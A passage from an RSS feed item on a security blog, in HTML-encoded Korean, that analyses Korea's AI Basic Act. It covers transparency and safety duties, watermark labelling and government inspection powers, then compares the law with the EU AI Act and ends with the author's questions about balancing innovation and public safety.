id="2-&#xC6CC;&#xD130;&#xB9C8;&#xD06C;-&#xD45C;&#xC2DC;-&#xC758;&#xBB34;&#xD654;"><a href="#2-&#xC6CC;&#xD130;&#xB9C8;&#xD06C;-&#xD45C;&#xC2DC;-&#xC758;&#xBB34;&#xD654;" class="headerlink" title="2) &#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;"></a>2) &#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;</h3><ul><li><strong>&#xD22C;&#xBA85;&#xC131; &#xD655;&#xBCF4; &#xC758;&#xBB34; (&#xC81C;31&#xC870;)</strong><ul><li>&#xACE0;&#xC601;&#xD5A5; &#xB610;&#xB294; &#xC0DD;&#xC131;&#xD615; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC81C;&#xD488;&#xC774;&#xB098; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD560; &#xACBD;&#xC6B0;, &#xD574;&#xB2F9; &#xC0AC;&#xC2E4;&#xC744; &#xC774;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC0AC;&#xC804;&#xC5D0; &#xBA85;&#xD655;&#xD788; &#xACE0;&#xC9C0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC0DD;&#xC131;&#xD615; AI&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xACB0;&#xACFC;&#xBB3C;&#xC784;&#xC744; &#xBA85;&#xC2DC;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xD604;&#xC2E4;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xAC00;&#xC0C1; &#xACB0;&#xACFC;&#xBB3C;&#xC744; &#xC81C;&#xACF5;&#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xACE0;&#xC9C0; &#xB610;&#xB294; &#xD45C;&#xC2DC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xBC18;&#xD560; &#xACBD;&#xC6B0; 3&#xCC9C;&#xB9CC; &#xC6D0; &#xC774;&#xD558;&#xC758; &#xACFC;&#xD0DC;&#xB8CC;&#xAC00; &#xBD80;&#xACFC;&#xB41C;&#xB2E4;.</li></ul></li><li><strong>&#xC548;&#xC804;&#xC131; &#xD655;&#xBCF4; &#xC758;&#xBB34; (&#xC81C;32&#xC870;)</strong><ul><li>AI &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xAC1C;&#xBC1C;&#xBD80;&#xD130; &#xD65C;&#xC6A9;, &#xD3D0;&#xAE30;&#xAE4C;&#xC9C0; &#xC804; &#xC0DD;&#xC560;&#xC8FC;&#xAE30;&#xC5D0; &#xAC78;&#xCE5C; &#xC704;&#xD5D8;&#xC744; &#xC0AC;&#xC804; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD3C9;&#xAC00;&#xD558;&#xC5EC; &#xC644;&#xD654; &#xB300;&#xCC45;&#xC744; &#xB9C8;&#xB828;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC77C;&#xC815; &#xAE30;&#xC900; &#xC774;&#xC0C1;&#xC758; &#xC5F0;&#xC0B0;&#xB7C9;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xAC15;&#xD654;&#xB41C; &#xC548;&#xC804;&#xC131; &#xAE30;&#xC900;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xC704;&#xD5D8; &#xBC1C;&#xC0DD; &#xC2DC; &#xB300;&#xC751; &#xCCB4;&#xACC4; &#xAD6C;&#xCD95; &#xBC0F; &#xC9C0;&#xC18D;&#xC801;&#xC778; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xCCB4;&#xACC4; &#xD655;&#xBCF4;&#xAC00; &#xD544;&#xC218;&#xC774;&#xBA70;, &#xC774;&#xD589; &#xACB0;&#xACFC;&#xB294; &#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;&#xC7A5;&#xAD00;&#xC5D0;&#xAC8C; &#xC815;&#xAE30; &#xBCF4;&#xACE0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</li></ul></li></ul><p>AI&#xAC00; &#xC601;&#xD654;, &#xC6F9;&#xD230;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xB4F1;&#xC758; &#xC81C;&#xC791;&#xC5D0; &#xD65C;&#xC6A9;&#xB420; &#xB54C; <strong>&#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654;</strong>&#xAC00; &#xCC3D;&#xC791; &#xD65C;&#xB3D9;&#xC5D0; &#xBD80;&#xC815;&#xC801;&#xC778; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC9C0;&#xC801;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. AI&#xAC00; &#xBC30;&#xACBD; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB4F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xB54C;, &#xC6CC;&#xD130;&#xB9C8;&#xD06C;&#xB97C; &#xC77C;&#xC77C;&#xC774; &#xBD80;&#xCC29;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xBA74; &#xCF58;&#xD150;&#xCE20; &#xD488;&#xC9C8;&#xACFC; &#xCC3D;&#xC791; &#xC790;&#xC720;&#xB97C; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC6B0;&#xB824;&#xAC00; &#xC81C;&#xAE30;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-&#xC815;&#xBD80;&#xC758;-&#xC870;&#xC0AC;-&#xAD8C;&#xD55C;"><a href="#3-&#xC815;&#xBD80;&#xC758;-&#xC870;&#xC0AC;-&#xAD8C;&#xD55C;" class="headerlink" title="3) &#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;"></a>3) &#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;</h3><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC740; &#xC815;&#xBD80;&#xC5D0;&#xAC8C; &#xACE0;&#xC601;&#xD5A5; AI &#xC0AC;&#xC5C5;&#xC744; &#xC0AC;&#xC804; &#xAC80;&#xD1A0;&#xD558;&#xAC70;&#xB098; &#xC778;&#xC99D;&#xD560; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xAC1C;&#xC778; &#xC815;&#xBCF4; &#xC720;&#xCD9C;</strong>&#xC774;&#xB098; <strong>&#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xC704;&#xD611;</strong> &#xB4F1;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC6B0;&#xB824;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACFC;&#xB3C4;&#xD55C; &#xC0AC;&#xC2E4; &#xC870;&#xC0AC;&#xB098; &#xAC80;&#xC99D;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xAE30;&#xC900;&#xC744; &#xB9C8;&#xB828;&#xD560; &#xD544;&#xC694;&#xC131;&#xC774; &#xC81C;&#xAE30;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="5-EU-AI&#xBC95;&#xACFC;&#xC758;-&#xBE44;&#xAD50;"><a href="#5-EU-AI&#xBC95;&#xACFC;&#xC758;-&#xBE44;&#xAD50;" class="headerlink" title="5. EU AI&#xBC95;&#xACFC;&#xC758; &#xBE44;&#xAD50;"></a>5. EU AI&#xBC95;&#xACFC;&#xC758; &#xBE44;&#xAD50;</h2><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xACFC; <strong>EU AI&#xBC95;</strong>&#xC740; &#xADDC;&#xC81C; &#xB300;&#xC0C1;, &#xBC94;&#xC704;, &#xC81C;&#xC7AC; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. EU AI&#xBC95;&#xC740; AI&#xB97C; &#xC704;&#xD5D8;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; <strong>4&#xAC00;&#xC9C0; &#xC720;&#xD615;</strong>&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xD558;&#xC5EC; &#xC138;&#xBD84;&#xD654;&#xB41C; &#xADDC;&#xC81C;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xB294; &#xBC18;&#xBA74;, &#xD55C;&#xAD6D;&#xC758; AI &#xAE30;&#xBCF8;&#xBC95;&#xC740; <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC640; <strong>&#xC0DD;&#xC131;&#xD615; AI</strong>&#xC5D0;&#xB9CC; &#xADDC;&#xC81C;&#xB97C; &#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; EU AI&#xBC95;&#xC740; &#xD6E8;&#xC52C; &#xB354; &#xC5C4;&#xACA9;&#xD55C; &#xCC98;&#xBC8C;&#xC744; &#xADDC;&#xC815;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC81C;&#xC7AC;&#xAC00; <strong>&#xC804; &#xC138;&#xACC4; &#xB9E4;&#xCD9C;&#xC758; &#xCD5C;&#xB300; 7%</strong>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xACFC;&#xC9D5;&#xAE08; &#xBD80;&#xACFC;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xD56D;&#xBAA9;</th><th>EU AI&#xBC95;</th><th>K-AI&#xBC95;</th></tr></thead><tbody><tr><td><strong>&#xC81C;&#xC815; &#xBAA9;&#xC801;</strong></td><td>&#xC778;&#xAC04; &#xC911;&#xC2EC;, &#xAE30;&#xBCF8;&#xAD8C; &#xBCF4;&#xD638;, &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; AI &#xD655;&#xC0B0;</td><td>AI &#xAE30;&#xC220; &#xBC0F; &#xC0B0;&#xC5C5; &#xC9C4;&#xD765;, &#xAE00;&#xB85C;&#xBC8C; &#xACBD;&#xC7C1;&#xB825; &#xD655;&#xBCF4;</td></tr><tr><td><strong>&#xC785;&#xBC95; &#xCCA0;&#xD559;</strong></td><td><strong>&#xC704;&#xD5D8; &#xAE30;&#xBC18; &#xC811;&#xADFC;(Risk-based approach)</strong>, &#xC0AC;&#xC804; &#xADDC;&#xC81C; &#xC911;&#xC2EC;</td><td><strong>&#xC9C4;&#xD765; &#xC6B0;&#xC120; &#xC811;&#xADFC;</strong>, &#xC720;&#xC5F0;&#xD55C; &#xADDC;&#xC81C; &#xAD6C;&#xC870;</td></tr></tbody></table></div><p>EU&#xB294; <strong>&#xAE30;&#xBCF8;&#xAD8C; &#xBCF4;&#xD638;</strong>&#xC640; <strong>&#xC2DC;&#xC7A5; &#xD1B5;&#xD569;</strong>, <strong>&#xAE30;&#xC220; &#xC2E0;&#xB8B0;&#xC131; &#xD655;&#xBCF4;</strong>&#xB97C; &#xC8FC;&#xC694; &#xBAA9;&#xD45C;&#xB85C; &#xC0BC;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xAE30;&#xC220;&#xC758; &#xC704;&#xD5D8;&#xB3C4;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xADDC;&#xC81C;&#xB97C; &#xCC28;&#xB4F1; &#xC801;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74; K-AI&#xBC95;&#xC740; AI &#xC0B0;&#xC5C5;&#xC758; <strong>&#xC131;&#xC7A5; &#xC7A0;&#xC7AC;&#xB825;</strong>&#xC5D0; &#xC8FC;&#xBAA9;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, <strong>&#xAE30;&#xC220; &#xAC1C;&#xBC1C;&#xACFC; &#xC0DD;&#xD0DC;&#xACC4; &#xD65C;&#xC131;&#xD654;</strong>&#xC5D0; &#xBC29;&#xC810;&#xC744; &#xB454; &#xC720;&#xC5F0;&#xD55C; &#xADDC;&#xC81C; &#xAD6C;&#xC870;&#xB97C; &#xCD94;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>EU AI&#xBC95;: &#xD3EC;&#xAD04;&#xC801;&#xB7;&#xC815;&#xAD50;&#xD55C; &#xBD84;&#xB958;&#xCCB4;&#xACC4;</strong><ul><li>AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; <strong>4&#xB2E8;&#xACC4; &#xC704;&#xD5D8; &#xC218;&#xC900;</strong>(&#xAE08;&#xC9C0;, &#xACE0;&#xC704;&#xD5D8;, &#xC81C;&#xD55C;&#xC801; &#xC704;&#xD5D8;, &#xCD5C;&#xC18C; &#xC704;&#xD5D8;)&#xC73C;&#xB85C; &#xBD84;&#xB958;</li><li>&#xACE0;&#xC704;&#xD5D8; AI&#xB294; <strong>&#xC0AC;&#xC804; &#xC801;&#xD569;&#xC131; &#xD3C9;&#xAC00;</strong>, <strong>&#xAE30;&#xC220;&#xBB38;&#xC11C;&#xD654;</strong>, <strong>&#xB85C;&#xADF8; &#xBCF4;&#xAD00;</strong>, <strong>&#xC778;&#xAC04; &#xAC10;&#xB3C5; &#xC758;&#xBB34; &#xB4F1;</strong>&#xC744; &#xAC16;&#xCDB0;&#xC57C; &#xD568;</li><li>&#xC608;: &#xC6D0;&#xACA9; &#xC0DD;&#xCCB4;&#xC778;&#xC2DD;, &#xD559;&#xC0DD;&#xB7;&#xADFC;&#xB85C;&#xC790; &#xAC10;&#xC2DC;, &#xC2E0;&#xC6A9;&#xD3C9;&#xAC00;, &#xBCF4;&#xD5D8; &#xAC00;&#xACA9; &#xCC45;&#xC815; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;</li></ul></li><li><strong>K-AI&#xBC95;: &#xACE0;&#xC601;&#xD5A5;&#xB7;&#xC0DD;&#xC131;&#xD615; AI &#xC911;&#xC2EC;</strong><ul><li>&#x2018;&#xACE0;&#xC601;&#xD5A5; AI&#x2019;, &#x2018;&#xC0DD;&#xC131;&#xD615; AI&#x2019;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xB418; &#xAD6C;&#xCCB4;&#xC801; &#xC815;&#xC758;&#xB294; &#xBAA8;&#xD638;&#xD568;</li><li>&#xADDC;&#xC81C;&#xBCF4;&#xB2E4;&#xB294; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;&#xACFC; &#xC2DC;&#xD589;&#xB839; &#xC911;&#xC2EC;&#xC758; <strong>&#xC790;&#xC728;&#xC801;&#xB7;&#xC720;&#xC5F0;&#xD55C; &#xC801;&#xC6A9;</strong> &#xCD94;&#xAD6C;</li></ul></li></ul><h2 id="6-&#xD5A5;&#xD6C4;-&#xACFC;&#xC81C;&#xC640;-&#xC758;&#xACAC;-&#xC81C;&#xC2DC;-&#xD544;&#xC694;&#xC131;"><a href="#6-&#xD5A5;&#xD6C4;-&#xACFC;&#xC81C;&#xC640;-&#xC758;&#xACAC;-&#xC81C;&#xC2DC;-&#xD544;&#xC694;&#xC131;" class="headerlink" title="6. &#xD5A5;&#xD6C4; &#xACFC;&#xC81C;&#xC640; &#xC758;&#xACAC; &#xC81C;&#xC2DC; &#xD544;&#xC694;&#xC131;"></a>6. &#xD5A5;&#xD6C4; &#xACFC;&#xC81C;&#xC640; &#xC758;&#xACAC; &#xC81C;&#xC2DC; &#xD544;&#xC694;&#xC131;</h2><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC5D0; &#xB300;&#xD55C; &#xD3C9;&#xAC00;&#xB294; &#xAE0D;&#xC815;&#xACFC; &#xC6B0;&#xB824;&#xAC00; &#xACF5;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. AI &#xAE30;&#xC220;&#xACFC; &#xC0B0;&#xC5C5;&#xC744; &#xC9C4;&#xD765;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xBC95;&#xC801; &#xAE30;&#xBC18;&#xC744; &#xB9C8;&#xB828;&#xD588;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xC788;&#xC9C0;&#xB9CC;, &#xACE0;&#xC704;&#xD5D8; AI&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xC758;&#xAC00; &#xBD88;&#xBA85;&#xD655;&#xD558;&#xACE0; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBC0F; &#xC800;&#xC791;&#xAD8C; &#xBCF4;&#xD638; &#xB4F1; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xBBF8;&#xBE44;&#xD558;&#xB2E4;&#xB294; &#xBE44;&#xD310;&#xB3C4; &#xC81C;&#xAE30;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xAD00;&#xB828; &#xC0AC;&#xC5C5;&#xC790;&#xB4E4;&#xC774; &#xC2DC;&#xD589;&#xB839;&#xACFC; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778; &#xC81C;&#xC815; &#xACFC;&#xC815;&#xC5D0; &#xC801;&#xADF9; &#xCC38;&#xC5EC;&#xD574; &#xBC95;&#xC758; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC744; &#xBCF4;&#xC644;&#xD574; &#xB098;&#xAC00;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD544;&#xC790;&#xB294; &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC758; &#xC18D;&#xB3C4;&#xC5D0; &#xBE44;&#xD574; &#xC815;&#xCC45;&#xC774; &#xB4A4;&#xB530;&#xB77C;&#xAC00;&#xB294; &#xD604;&#xC2E4;&#xC774; &#xB298; &#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xACE0; &#xC900;&#xBE44;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC123;&#xBD88;&#xB9AC; &#xBC95;&#xACFC; &#xC81C;&#xB3C4;&#xB97C; &#xB3C4;&#xC785;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC704;&#xD5D8;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC815;&#xCC45;&#xC774; &#xC0DD;&#xAE30;&#xBA74; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xADDC;&#xC81C;&#xAC00; &#xC0DD;&#xAE30;&#xACE0;, &#xC774;&#xB294; &#xACB0;&#xAD6D; &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC744; &#xC800;&#xD574;&#xD558;&#xB294; &#xACB0;&#xACFC;&#xB97C; &#xB0B3;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; AI&#xCC98;&#xB7FC; &#xBE60;&#xB978; &#xC804;&#xD658;&#xACFC; &#xD601;&#xC2E0;&#xC774; &#xC911;&#xC694;&#xD55C; &#xBD84;&#xC57C;&#xC5D0;&#xC11C;&#xB294;, &#xADDC;&#xC81C;&#xAC00; &#xAE30;&#xC220;&#xC758; &#xC18D;&#xB3C4;&#xB97C; &#xC9C0;&#xB098;&#xCE58;&#xAC8C; &#xC81C;&#xD55C;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xACB0;&#xAD6D; &#xC6B0;&#xB9AC;&#xB098;&#xB77C;&#xAC00; &#xAE00;&#xB85C;&#xBC8C; &#xACBD;&#xC7C1;&#xC5D0;&#xC11C; &#xB4A4;&#xCC98;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xB3C4; &#xBC30;&#xC81C;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC744; &#xC77D;&#xACE0; &#xC788;&#xB294; &#xB3C5;&#xC790; &#xBCF8;&#xC778; &#xC2A4;&#xC2A4;&#xB85C;&#xC5D0;&#xAC8C; &#xC9C8;&#xBB38;&#xD574;&#xBCF4;&#xB294;&#xAC74; &#xC5B4;&#xB5A4;&#xAC00;&#xC694;?<br><strong>&#x201C;&#xAE30;&#xC220;&#xC758; &#xC18D;&#xB3C4;&#xB97C; &#xB530;&#xB77C;&#xC7A1;&#xB294; &#xADDC;&#xC81C;&#xB294; &#xAC00;&#xB2A5;&#xD55C;&#xAC00;?&#x201D;</strong><br><strong>&#x201C;&#xB9CC;&#xC57D; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74;, &#xC6B0;&#xB9AC;&#xB294; &#xAE30;&#xC220;&#xC744; &#xBA3C;&#xC800; &#xD5C8;&#xC6A9;&#xD558;&#xACE0; &#xBB38;&#xC81C;&#xB97C; &#xC0AC;&#xD6C4;&#xC5D0; &#xBCF4;&#xC644;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB098;&#xC544;&#xAC00;&#xC57C; &#xD558;&#xB294;&#xAC00;?&#x201D;</strong><br><strong>&#x201C;&#xAE30;&#xC220; &#xBC1C;&#xC804;&#xACFC; &#xACF5;&#xACF5;&#xC758; &#xC548;&#xC804;, &#xC5B4;&#xB290; &#xCABD;&#xC5D0; &#xB354; &#xBB34;&#xAC8C;&#xB97C; &#xB450;&#xC5B4;&#xC57C; &#xD560;&#xAE4C;?&#x201D;</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1">https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1</a><br><a href="https://www.skshieldus.com/blog-security/security-trend-idx50">https://www.skshieldus.com/blog-security/security-trend-idx50</a><br><a href="https://v.daum.net/v/20250418162437559">https://v.daum.net/v/20250418162437559</a><br><a href="https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461">https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461</a><br><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a><br><a href="https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1">https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/ai/">ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/aiAct/">aiAct</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
